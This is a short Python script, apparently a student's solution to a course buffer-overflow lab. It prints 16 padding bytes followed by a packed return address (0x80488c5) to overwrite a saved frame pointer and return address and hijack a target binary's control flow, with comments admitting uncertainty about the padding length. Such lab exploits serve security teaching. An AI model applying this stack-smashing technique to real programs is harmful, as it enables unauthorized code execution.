#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"A"*16) # Clears 4 char buffer and previous EBP
sys.stdout.buffer.write(pack("<I", 0x80488c5))

# I'm not actually sure why I have to use *16 in the first line..
# The disasembled code seems to create way more space on the stack
# than actually required. Anyways, *16 is what works based on the assembly
